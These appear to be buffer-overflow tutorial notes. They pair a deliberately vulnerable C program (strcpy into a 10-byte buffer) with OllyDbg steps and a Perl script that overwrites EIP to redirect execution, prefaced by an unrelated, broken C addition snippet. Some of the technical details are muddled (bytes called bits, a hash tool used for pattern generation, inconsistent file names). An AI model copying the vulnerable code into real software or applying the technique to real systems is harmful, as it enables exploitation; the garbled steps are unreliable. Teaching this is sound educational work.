#include<stdio.h>
void main()
{
    int a, b, sum;
    printf("Enter first number\n");
    scanf("%d",%a);
    printf("Enter second number\n");
    scanf("%d",%b);
    sum = a+b;
    printf("%d",sum);
}


Data Structures
---------------
These are the ways in which we store our data.
    1. Array
    2. Linked List
    3. structure
    4. union
    5. heap
    6. stack


Introduction
------------
Buffer overflow is a situation arises when you try to put the data in an array which is more than the size of the array and you haven’t put any exception handling. So you keep on filling the array but the time comes when array ends and you overwrite what was there.

Benefits of BoF
---------------
When you overwrite the memory data, you can overwrite EIP (Instruction Pointer) which is critical for any application as it holds the return address so when the function ends, it will find ret instruction which will put the program counter at the value which EIP is holding. So if you can change that value you can change the program flow and make it execute something else.

Requirement:
    1. Ollydbg



Buffer OverFlow Vulnerable code:

#include<conio.h>
#include<stdio.h>
#include<string.h>

int overflow(char *s)
{
    char buffer[10];    //our buffer
    strcpy(buffer,s);   //vulnerable code... copy s into buffer
    return 0;
}

void exploit()
{
     printf("You passed !!!!!! \n");
}

int main(int argc, char *argv[])
{
    int a = 0;
    printf("You are in the main code \n");
    overflow(argv[1]);
    if(a == 1)
    {
         exploit();
    }
    else
    {
        printf("You have failed the city\n");
    }
    return 0;
}
    


Execute----> compile ----> we will get a .exe file

cmd --> name.exe sdklvns

cmd --> name.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
error
----> view problem details
    Exception Offset:   41414141

Start ollydbg
-------------
Open name.exe
check as the program flow, where exploit is been called


00401316  |. E8 94FFFFFF    CALL akku.004012AF


00401316

Convert it into little Endian Form ---> Reverse in the pair
        00401316 
        00 40 13 16
        16 13 40 00 

Ok so now we got the new address for the EIP. Let’s find at how many byte from the buffer the actual EIP is. To do this we need to create a long string of random characters without repeating sequence
To do this use online string to hash tools.
http://www.fileformat.info/tool/hash.htm

Hash value of 16 13 40 00 is

1e66186a8e7f4a61ebaae3f46ae29b7520970ee1d605a28b3f55fe440002e44dd919a774edde630a8eed58831cd0004cea5b3b7f4ed9c2b45b39e62b258d87ba

Now run the name.exe with the above hash value...
  Exception Offset: 35376239

Convert it into Little Endian Form

        35376239
        35 37 62 39
        39 62 37 35
        39:62:37:35

http://www.dolcevie.com/js/converter.html
        for converting hex value to ASCII

        9b75
1e66186a8e7f4a61ebaae3f46ae29b7520970ee1d605a28b3f55fe440002e44dd919a774edde630a8eed58831cd0004cea5b3b7f4ed9c2b45b39e62b258d87ba

Calculate the number of bytes which is being transmitted before the patter we received. 
There are 28 bits.... after 28 bites EIP can be overwrite.



1e66186a8e7f4a61ebaae3f46ae29b75






#!/usr/bin/perl
my $junkdata ="\x41"x28; #28 bits of data junk data
my $ret="\x16\x13\x40\x00"; #address where my exploit is 
my $exploit=$junkdata.$ret; # combining two data
print "Sending Exploit......\n\n";
system("Lovely.exe",$exploit);
print "\n Done with akku..... Buffer OverFlow Successfull\n";




cmd ---> pulkit.pl


**** TASK
---------
Run calculator using buffer OverFlow